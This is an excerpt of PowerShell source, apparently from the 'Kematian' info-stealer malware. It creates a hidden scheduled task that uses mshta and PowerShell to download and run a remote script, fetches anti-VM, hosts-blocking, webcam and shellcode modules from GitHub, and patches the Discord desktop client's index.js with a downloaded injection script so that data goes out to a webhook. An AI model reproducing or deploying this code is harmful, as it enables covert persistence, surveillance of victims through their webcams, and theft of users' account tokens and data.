...
function Invoke-TASKS {
    ...
    if ($persistence) {
        ...
        $task_action = if ($debug) {
            New-ScheduledTaskAction -Execute "Powershell.exe" -Argument "-ExecutionPolicy Bypass -NoProfile -C `"`$webhook = '$webhook' ; iwr https://raw.githubusercontent.com/Sandeep-2110677/Kematian/main/frontend-src/autorun.ps1 | iex`""
        } else {
            New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `$webhook='$webhook';iwr('https://raw.githubusercontent.com/Sandeep-2110677/Kematian/main/frontend-src/autorun.ps1')|iex`",0)(window.close)"
        }
    ...
    if ($blockhostsfile) {
        $link = "https://github.com/Sandeep-2110677/Kematian/raw/main/frontend-src/blockhosts.ps1"
...
function VMPROTECT {
    $link = ("https://github.com/Sandeep-2110677/Kematian/raw/main/frontend-src/antivm.ps1")
...
function Backup-Data {
    ...
    $webcam = ("https://github.com/Sandeep-2110677/Kematian/raw/main/frontend-src/webcam.ps1")
            ...
            if ($_ -is [System.IO.DirectoryInfo] -and ($_.FullName -match "discord_desktop_core")) {
                ...
                foreach ($file in $files) {
                    if ($file.Name -eq "index.js") {
                        ...
                        $content = $webClient.DownloadString("https://raw.githubusercontent.com/Sandeep-2110677/Kematian/main/frontend-src/injection.js")
                        if ($content -ne "") {
    ...
    $kematian_shellcode = ("https://github.com/Sandeep-2110677/Kematian/raw/main/frontend-src/kematian_shellcode.ps1")
    ...
    $embed_and_body = @{
        ...
        "embeds"      = @(
            @{
                ...
                "url"         = "https://github.com/Sandeep-2110677/Kematian"
